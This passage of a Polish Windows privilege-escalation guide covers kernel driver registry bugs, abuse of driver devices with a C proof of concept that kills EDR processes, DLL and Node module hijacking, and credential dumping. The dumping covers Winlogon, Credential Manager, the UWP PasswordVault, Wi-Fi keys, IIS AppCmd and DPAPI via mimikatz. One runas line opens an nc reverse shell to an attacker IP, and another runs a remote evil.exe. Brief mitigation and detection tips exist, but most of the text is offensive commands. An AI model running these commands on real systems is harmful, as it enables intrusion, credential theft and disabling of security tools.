- **Mitigacja w Windows 8+**: jeśli zapytanie dotyczy **niezaufanego hive** z `RTL_QUERY_REGISTRY_DIRECT`, ale bez `RTL_QUERY_REGISTRY_TYPECHECK`, wywołania z kernela powodują awarię `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować możliwość eksploatacji, szukaj **kluczy zapisywalnych przez atakującego w zaufanych hive systemowych**, zamiast umieszczać wartości w `HKCU`.
- **Przygotowanie w zaufanym hive**: użyj NtObjectManager, aby wyliczyć zapisywalne klucze potomne `\Registry\Machine`, a następnie ponownie uruchom skanowanie z duplikatem tokena **low-integrity**, aby znaleźć klucze dostępne z kontekstów sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane na stosie i może częściowo nadpisać pobliski wskaźnik callbacka/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb bezpośredni wymaga, aby `EntryContext` wskazywał na `UNICODE_STRING`. Jeśli kod najpierw wczytuje kontrolowany przez atakującego `REG_DWORD` do zmiennej skalarnej na stosie, a następnie ponownie używa tego samego bufora do odczytu ciągu znaków, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, uzyskując w ten sposób częściowo kontrolowany zapis do pamięci jądra.
- **`REG_BINARY`**: w przypadku dużych danych binarnych tryb bezpośredni traktuje pierwszy `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli wcześniejszy odczyt `REG_DWORD` pozostawi w ponownie użytej zmiennej wartość ujemną kontrolowaną przez atakującego, następne zapytanie `REG_BINARY` kopiuje bajty atakującego bezpośrednio do sąsiednich slotów na stosie. Jest to często najprostsza droga do pełnego nadpisania wskaźnika callbacka.

Przydatny wzorzec do wyszukiwania: **odczyty rejestru różnych typów do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Szukaj `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używanych wskaźników `EntryContext` oraz ścieżek kodu, w których pierwszy odczyt rejestru decyduje o wykonaniu drugiego.

#### Nadużywanie braku FILE_DEVICE_SECURE_OPEN w obiektach urządzeń (LPE + wyłączenie EDR)

Niektórzy podpisani sterownicy firm trzecich tworzą obiekt urządzenia z restrykcyjnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi bezpieczna lista DACL nie jest egzekwowana, gdy urządzenie jest otwierane przez ścieżkę zawierającą dodatkowy komponent. Dzięki temu każdy nieuprzywilejowany użytkownik może uzyskać uchwyt, używając ścieżki przestrzeni nazw takiej jak:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z rzeczywistego przypadku)

Gdy użytkownik może otworzyć urządzenie, może nadużyć uprzywilejowanych kodów IOCTL udostępnianych przez sterownik w celu uzyskania LPE i manipulowania systemem. Przykładowe możliwości zaobserwowane w praktyce:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokena / powłoka SYSTEM przez DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony surowy odczyt/zapis dysku (manipulowanie danymi offline, sztuczki z trwałością przy rozruchu).
- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co umożliwia wyłączenie AV/EDR z poziomu użytkownika za pośrednictwem jądra.

Minimalny wzorzec PoC (tryb użytkownika):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Łagodzenie zagrożeń dla developerów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone przez DACL.
- Weryfikuj kontekst wywołującego podczas operacji uprzywilejowanych. Dodaj kontrole PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie uchwytów.
- Ogranicz IOCTLs (access masks, METHOD_*, walidacja danych wejściowych) i rozważ modele pośredniczące zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla osób odpowiedzialnych za obronę
- Monitoruj otwieranie podejrzanych nazw urządzeń w trybie user-mode (np. \\ .\\amsdk*) oraz konkretne sekwencje IOCTL wskazujące na nadużycia.
- Wymuszaj stosowanie listy blokowanych podatnych sterowników firmy Microsoft (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych i blokowanych elementów.


## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu w folderze znajdującym się na PATH**, możesz przejąć kontrolę nad biblioteką DLL ładowaną przez proces i **eskalować uprawnienia**.<sup>[[2]](#references)</sup>

Sprawdź uprawnienia do wszystkich folderów znajdujących się na PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Więcej informacji o tym, jak wykorzystać tę kontrolę:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Przejęcie rozwiązywania modułów Node.js / Electron przez `C:\node_modules`

Jest to wariant **niekontrolowanej ścieżki wyszukiwania w Windows**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują import bezpośredni, taki jak `require("foo")`, a oczekiwany moduł **nie istnieje**.<sup>[[20]](#references)</sup>

Node wyszukuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W Windows wyszukiwanie może dotrzeć do katalogu głównego dysku, więc aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może sprawdzać kolejno:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **użytkownik z niskimi uprawnieniami** może utworzyć `C:\node_modules`, może umieścić tam złośliwy plik `foo.js` (lub folder pakietu) i zaczekać, aż **proces Node/Electron o wyższych uprawnieniach** spróbuje rozwiązać brakującą zależność. Payload zostanie wykonany w kontekście bezpieczeństwa procesu ofiary, co prowadzi do **LPE**, gdy proces docelowy działa jako administrator, w ramach podwyższonego zadania harmonogramu lub wrappera usługi albo jako automatycznie uruchamiana aplikacja desktopowa z podwyższonymi uprawnieniami.

Jest to szczególnie częste, gdy:

- zależność jest zadeklarowana w `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka innej firmy opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po błędzie
- pakiet został usunięty z buildów produkcyjnych, pominięty podczas pakowania lub nie udało się go zainstalować
- podatne wywołanie `require()` znajduje się głęboko w drzewie zależności, a nie w głównym kodzie aplikacji

### Wyszukiwanie podatnych celów

Użyj **Procmon**, aby potwierdzić ścieżkę rozwiązywania modułów:<sup>[[23]](#references)</sup>

- Filtruj według `Process Name` = plik wykonywalny celu (`node.exe`, plik EXE aplikacji Electron lub proces wrappera)
- Filtruj według `Path` `contains` `node_modules`
- Skup się na zdarzeniach `NAME NOT FOUND` i ostatnim pomyślnym otwarciu w `C:\node_modules`

Przydatne wzorce do wyszukiwania podczas przeglądu kodu w rozpakowanych plikach `.asar` lub źródłach aplikacji:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Zidentyfikuj **nazwę brakującego pakietu** na podstawie Procmon lub analizy kodu źródłowego.
2. Utwórz główny katalog wyszukiwania, jeśli jeszcze nie istnieje:

```powershell
mkdir C:\node_modules
```

3. Umieść moduł o dokładnie oczekiwanej nazwie:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Uruchom aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a właściwego modułu brakuje, Node może załadować `C:\node_modules\foo.js`.

Rzeczywiste przykłady brakujących modułów opcjonalnych pasujących do tego wzorca to `bluebird` i `utf-8-validate`, ale **technika** jest uniwersalna: znajdź dowolny **brakujący bare import**, który uprzywilejowany proces Windows Node/Electron będzie rozwiązywać.

### Pomysły na wykrywanie i hardening

- Generuj alert, gdy użytkownik utworzy `C:\node_modules` lub zapisze tam nowe pliki/pakiety `.js`.
- Wyszukuj procesy o wysokim poziomie integralności odczytujące pliki z `C:\node_modules\*`.
- Dołączaj wszystkie zależności runtime w środowisku produkcyjnym i audytuj użycie `optionalDependencies`.
- Sprawdzaj kod firm trzecich pod kątem wzorców `try { require("...") } catch {}` ignorujących błędy.
- Wyłączaj opcjonalne testy, jeśli biblioteka to obsługuje (na przykład niektóre wdrożenia `ws` mogą pominąć test dla starszego `utf-8-validate`, ustawiając `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udziały

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### plik hosts

Sprawdź, czy w pliku hosts są na sztywno wpisane inne znane komputery.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfejsy sieciowe i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otwarte porty

Sprawdź z zewnątrz **usługi z ograniczonym dostępem**

```bash
netstat -ano #Opened ports?
```

W przypadku lokalnego procesu nasłuchującego powiąż jego PID z właścicielem procesu, ścieżką pliku wykonywalnego oraz usługą lub zadaniem zaplanowanym, które go uruchamia. Usługa zdalnego sterowania może zapewnić dostęp jako jej użytkownik pulpitu tylko wtedy, gdy pozwalają na to mechanizmy uwierzytelniania i kontroli poleceń. Niestandardowa aplikacja TCP działająca na koncie o wyższych uprawnieniach wymaga osobnej analizy: proces nasłuchujący i ścieżka pliku binarnego to jedynie wskazówki, natomiast wykorzystanie podatności na uszkodzenie pamięci przez uwierzytelnioną ścieżkę wejściową wymaga analizy dokładnie tego pliku binarnego i dostępnych dla niego danych wejściowych. Jeśli odsłonięty port wydaje się należeć do procesu systemowego, porównaj go z [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), zanim przypiszesz go do usługi backendowej; sama reguła przekierowania nie dowodzi, że miejsce docelowe jest osiągalne ani podatne na ataki.

### Tabela routingu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reguły zapory

[**Sprawdź tę stronę, aby znaleźć polecenia związane z zaporą**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej[ poleceń do enumeracji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarny plik `bash.exe` można też znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszej próbie użycia `nc.exe` do nasłuchiwania na porcie pojawi się okno GUI z pytaniem, czy zezwolić zaporze na używanie `nc`).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Aby łatwo uruchomić bash jako root, możesz użyć `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

`root` w Linuksie działającym w WSL nie zapewnia sam w sobie uprawnień Administratora w Windows. Jeśli bieżąca tożsamość Windows może odczytać system plików dystrybucji, sprawdź pliki historii powłoki (w tym `/root/.bash_history`) pod kątem poleceń, które mogły zapisać dane uwierzytelniające; eskalacja nadal wymaga prawidłowego konta o wyższych uprawnieniach oraz dozwolonej ścieżki uwierzytelniania. Układ `LocalState\rootfs` dotyczy starszych instalacji WSL; WSL 2 zwykle przechowuje dystrybucję na [wirtualnym dysku `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), dlatego najpierw ustal faktyczną dystrybucję i ścieżkę przechowywania danych. Unikaj wyświetlania zawartości historii podczas automatycznego rozpoznawania.

## Poświadczenia Windows

### Poświadczenia Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traktuj `DefaultUserName` i `DefaultDomainName` jako kontekst konta, a nie dane uwierzytelniające. Niepusta wartość `DefaultPassword` lub `AltDefaultPassword` oznacza, że w rejestrze znaleziono hasło zapisane jawnym tekstem. Jeśli `AutoAdminLogon=1`, ale nie można odczytać hasła zapisanego jawnym tekstem, jest to tylko wskazówka: [Sysinternals Autologon może przechowywać hasło jako LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a zwykły odczyt rejestru nie pozwala ustalić, czy ten secret istnieje ani czy można go odzyskać. Przed zgłoszeniem ujawnienia danych uwierzytelniających sprawdź uprawnienia dostępu oraz rzeczywistą konfigurację logowania.

### Menedżer poświadczeń / Windows Vault

Z [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault przechowuje poświadczenia użytkowników do serwerów, witryn internetowych i innych programów, których **Windows** może używać, aby **automatycznie logować użytkowników**. Na początku może się wydawać, że użytkownicy mogą przechowywać w nim poświadczenia do witryn takich jak Facebook, Twitter czy Gmail, aby przeglądarki automatycznie ich logowały, ale tak to nie działa.

Windows Vault przechowuje poświadczenia, których Windows może używać do automatycznego logowania użytkowników. Oznacza to, że każda **aplikacja Windows, która potrzebuje poświadczeń, aby uzyskać dostęp do zasobu** (serwera lub witryny internetowej), **może korzystać z tego Credential Manager i Windows Vault** oraz używać podanych poświadczeń, zamiast za każdym razem wymagać od użytkowników wpisania nazwy użytkownika i hasła.

Jeśli aplikacje nie korzystają z Credential Manager, nie sądzę, by mogły używać poświadczeń do danego zasobu. Jeśli więc aplikacja ma korzystać z vault, powinna w jakiś sposób **komunikować się z menedżerem poświadczeń i pobierać z domyślnego vault poświadczenia do danego zasobu**.

Użyj `cmdkey`, aby wyświetlić zapisane poświadczenia na maszynie.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Następnie możesz użyć `runas` z opcją `/savecred`, aby użyć zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik binarny za pośrednictwem udziału SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Używanie `runas` z podanym zestawem danych uwierzytelniających.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Zauważ, że można użyć mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub modułu [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje Windows UWP, Microsoft Edge i nowoczesne usługi systemowe przechowują tokeny uwierzytelniające oraz hasła w postaci zwykłego tekstu w `PasswordVault` platformy Universal Windows Platform (UWP), widocznym również jako `Web Credentials` w `vaultcmd`. Ta przestrzeń przechowywania jest odizolowana dla każdej sesji i można ją odszyfrować natywnie bez uprawnień administracyjnych ani `SeDebugPrivilege`.

Wykonaj to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie zapisane nazwy użytkowników i hasła w postaci zwykłego tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** udostępnia metodę symetrycznego szyfrowania danych, używaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, który znacząco zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego pochodzącego z danych uwierzytelniających użytkownika używanych podczas logowania**. W przypadku szyfrowania systemowego wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkownika, chronione przez DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [Identyfikator zabezpieczeń](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, znajdujący się w tym samym pliku co klucz główny chroniący klucze prywatne użytkownika**, zazwyczaj składa się z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, więc nie można wyświetlić jego zawartości za pomocą polecenia `dir` w CMD, ale można to zrobić w PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Możesz użyć **modułu mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby go odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zwykle znajdują się w:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane do **scriptingu** i zadań automatyzacyjnych jako wygodny sposób przechowywania zaszyfrowanych danych uwierzytelniających. Są chronione za pomocą **DPAPI**, co zwykle oznacza, że można je odszyfrować tylko na tym samym komputerze i przez tego samego użytkownika, który je utworzył.

Wyeksportowany plik z poświadczeniami może mieć dowolną nazwę lub ścieżkę z rozszerzeniem `.xml`. Jeśli skrypt lub inwentaryzacja plików wskazuje taki plik, ustal rzeczywisty katalog profilu konta zamiast zakładać, że znajduje się on w `C:\Users`: [system Windows może przechowywać profile w innych lokalizacjach](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Możliwość odczytania pliku to tylko wskazówka; [Windows wiąże zaszyfrowane poświadczenia utworzone przez `Export-Clixml` z użytkownikiem i komputerem, na których zostały wyeksportowane](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a odzyskane konto musi osobno mieć odpowiednie uprawnienia do docelowej usługi. Najpierw sprawdź ścieżki i ACL, nie wyświetlając podczas rutynowej inwentaryzacji wartości zaszyfrowanych ani jawnych.

Aby **odszyfrować** poświadczenia PS z pliku, który je zawiera, możesz wykonać:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Ostatnio uruchamiane polecenia

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menedżer poświadczeń Pulpitu zdalnego**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Użyj modułu Mimikatz `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować dowolne pliki .rdg**\
Za pomocą modułu Mimikatz `sekurlsa::dpapi` możesz **wyodrębnić z pamięci wiele kluczy głównych DPAPI**

**mRemoteNG używa innego magazynu połączeń.** Sprawdź czytelne pliki XML w `%APPDATA%\mRemoteNG` i folderze Dokumenty użytkownika, w tym pliki o zwyczajnych nazwach, takich jak `config.xml`. Zidentyfikuj schemat połączeń i zaszyfrowane atrybuty `Password`, zanim potraktujesz plik XML jako źródło danych uwierzytelniających. Zapisana wartość nie jest hasłem DPAPI/RDCMan; jej odzyskanie zależy od ustawień szyfrowania pliku oraz od tego, czy użyto niestandardowego hasła głównego. Podczas szerokiego wyszukiwania unikaj wyświetlania zaszyfrowanych wartości.

**Eksporty profili Remote Desktop Plus** mogą być również czytelne w katalogach użytkowników lub w udostępnionym folderze administracyjnym. Starszy eksport `profiles.xml` zawiera wpisy `Data/Profile` z elementami `ProfileName`, `Password` i `Secure`. Niepusty element hasła traktuj jako potencjalne źródło danych uwierzytelniających, ale nie wyświetlaj go ani nie zakładaj, że zawiera tekst jawny: [producent informuje](https://www.donkz.nl/), że ochrona profilu może być powiązana z kontem i komputerem, na których go utworzono, lub skonfigurowana mniej restrykcyjnie. Zanim się na nim oprzesz, potwierdź pochodzenie pliku i warunki odzyskania danych.

### Sticky Notes

Użytkownicy często korzystają z aplikacji Sticky Notes na stacjach roboczych z systemem Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że jest ona oparta na pliku bazy danych. Plik ten znajduje się w lokalizacji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać i sprawdzić.

Użytkownicy czasami zapisują hasła i inne informacje w aplikacjach z karteczkami samoprzylepnymi. Aplikacja Sticky Notes instalowana jako pakiet firmy Microsoft zwykle przechowuje notatki w lokalizacji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starsze lub inne aplikacje mogą używać innych magazynów w profilu użytkownika, w tym LevelDB. Zanim uznasz brak pliku SQLite za brak notatek, ustal, jaka aplikacja jest zainstalowana i jakiego formatu magazynu używa.

Jeśli Sticky Notes korzysta z dziennika zapisu z wyprzedzeniem SQLite, kopia samego pliku `plum.sqlite` może nie zawierać ostatnio zatwierdzonych notatek. Zachowaj pasujący plik `plum.sqlite-wal` wraz ze spójną kopią bazy danych oraz dołącz plik `plum.sqlite-shm`, jeśli jest dostępny; indeks w pamięci współdzielonej można odbudować, ale plik WAL jest częścią trwałego stanu bazy danych. Zobacz [dokumentację WAL SQLite](https://www.sqlite.org/wal.html). Notatka zawierająca nazwę konta lub hasło jest tylko potencjalnym źródłem danych uwierzytelniających: osobno zweryfikuj konto, dozwolony dostęp i ponowne użycie hasła. Zaszyfrowany wpis menedżera haseł wymaga ponadto właściwego klucza deszyfrującego i interpretacji właściwej dla danej aplikacji, zanim będzie można uznać go za potwierdzenie możliwości logowania na konto o wyższych uprawnieniach.

### AppCmd.exe

**Pamiętaj, że aby odzyskać hasła z AppCmd.exe, musisz mieć uprawnienia Administratora i uruchomić go na poziomie High Integrity.**\
Plik **AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano pewne **dane uwierzytelniające**, które można **odzyskać**.

Ten kod został zaczerpnięty z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Sprawdź, czy plik `C:\Windows\CCM\SCClient.exe` istnieje.\
**Instalatory są uruchamiane z uprawnieniami SYSTEM**, a wiele z nich jest podatnych na **DLL Sideloading (informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Pliki i rejestr (dane uwierzytelniające)

### Artefakty danych uwierzytelniających w rejestrze narzędzi wsparcia

